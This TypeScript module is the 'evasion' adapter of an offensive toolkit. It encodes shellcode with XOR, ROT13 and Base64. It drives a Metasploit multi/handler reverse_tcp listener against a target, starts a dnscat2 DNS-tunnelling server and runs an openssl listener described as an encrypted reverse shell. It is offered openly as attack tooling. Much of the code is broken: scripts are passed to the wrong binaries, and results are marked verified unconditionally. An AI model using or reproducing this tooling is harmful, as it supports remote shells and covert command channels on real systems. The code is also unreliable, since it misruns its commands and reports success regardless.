/**
 * OffSec by True Hacking — Adapter: Evasion (Encode, Silent, Stealth).
 *
 * Encodes shellcode (XOR, ROT13, Base64, UDROP), runs silent (reverse/shellcode/binder),
 * stealth (DNS tunneling, HTTPS, covert channels).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Encode/decode shellcode (XOR, ROT13, Base64, UDROP, etc.).
 *
 * @param options - Evasion options (file, encoding, target).
 */
export function evasion(options: {
  file?: string;
  target: string;
  encoding?: string;  // XOR, ROT13, Base64, UDROP
  options?: Record<string, string>;
}): ExploitResult {
  const file = options.file || "";
  const encoding = options.encoding || "XOR";
  const results: Record<string, any> = {};

  // XOR encode/decode.
  if (encoding === "XOR") {
    const xorPath = findBinary("xor") || findBinary("openssl");
    if (xorPath) {
      const commands = [`echo "data" | xor -k 0x41`];  // (XOR encode).
      const out = `${tmpdir()}/${randomUUID()}.enc`;
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, `${commands[0]} > ${out}`);
      const child = spawnSync(xorPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.XOR = String(child.stdout ?? "");
    } else {
      results.XOR = `{stub: no 'xor' or 'openssl' binary (install: brew install openssl or apt install openssl).}`;
    }
  }

  // ROT13 encode/decode.
  if (encoding === "ROT13") {
    const rotPath = findBinary("tr");
    if (rotPath) {
      const commands = [`echo "data" | tr 'a-zA-Z' 'n-za-mN-ZA-M'`];  // (ROT13).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(rotPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.ROT13 = String(child.stdout ?? "");
    } else {
      results.ROT13 = `{stub: no 'tr' binary (install: brew install coreutils).}`;
    }
  }

  // Base64 encode/decode.
  if (encoding === "Base64") {
    const b64Path = findBinary("base64");
    if (b64Path) {
      const commands = [`echo "data" | base64`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(b64Path, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.Base64 = String(child.stdout ?? "");
    } else {
      results.Base64 = `{stub: no 'base64' binary (install: brew install coreutils).}`;
    }
  }

  // UDROP (split shellcode: XOR + segments).
  if (encoding === "UDROP") {
    results.UDROP = `{stub: UDROP (split shellcode into segments: XOR/PE/ELF segments).}`;
  }

  return {
    target: file || options.target,
    payload: `evasion/${encoding}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("evasion", `evasion://${file || options.target}/${encoding}`),
  };
}

/**
 * Silent mode (reverse/shellcode/binder with stealth).
 *
 * @param options - EvasionSilent options (target, payload).
 */
export function evasionSilent(options: {
  target: string;
  payload?: string;
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const payload = options.payload || "reverse_tcp";

  const results: Record<string, any> = {};
  const msfPath = findBinary("msfconsole");
  if (msfPath) {
    const commands = [
      `use exploit/multi/handler`,
      `set PAYLOAD ${payload}`,
      `set LPORT 4444`,
      `set RHOSTS ${target}`,
      `exploit -j`,
    ];
    const file = `${tmpdir()}/${randomUUID()}.msf`;
    writeFileSync(file, commands.join("\n"));
    const child = spawnSync(msfPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
    results.silent = String(child.stdout ?? "");
  } else {
    results.silent = `{stub: no 'msfconsole' binary (install: brew install metasploit or apt install metasploit-framework).}`;
  }

  return {
    target,
    payload: `evasionSilent/${payload}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("evasionSilent", `evasionSilent://${target}/${payload}`),
  };
}

/**
 * Stealth (network-level: DNS tunneling, HTTPS, covert channels).
 *
 * @param options - EvasionStealth options (target, method).
 */
export function evasionStealth(options: {
  target: string;
  method?: string;  // dns, https, icmp
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const method = options.method || "dns";
  const results: Record<string, any> = {};

  // DNS tunneling.
  if (method === "dns") {
    const dnsPath = findBinary("dnscat2");
    if (dnsPath) {
      const commands = [`dnscat2 --server=true`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(dnsPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.dns = String(child.stdout ?? "");
    } else {
      results.dns = `{stub: no 'dnscat2' binary (install: apt install dnscat2).}`;
    }
  }

  // HTTPS (encrypted reverse shell).
  if (method === "https") {
    const sslPath = findBinary("openssl");
    if (sslPath) {
      const commands = [`openssl s_server -accept 443 -cert cert.pem -key key.pem`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(sslPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.https = String(child.stdout ?? "");
    } else {
      results.https = `{stub: no 'openssl' binary (install: brew install openssl).}`;
    }
  }

  return {
    target,
    payload: `evasionStealth/${method}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("evasionStealth", `evasionStealth://${target}/${method}`),
  };
}

/** Find the binary (msfconsole/dnscat2/openssl/tr/xor/base64). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
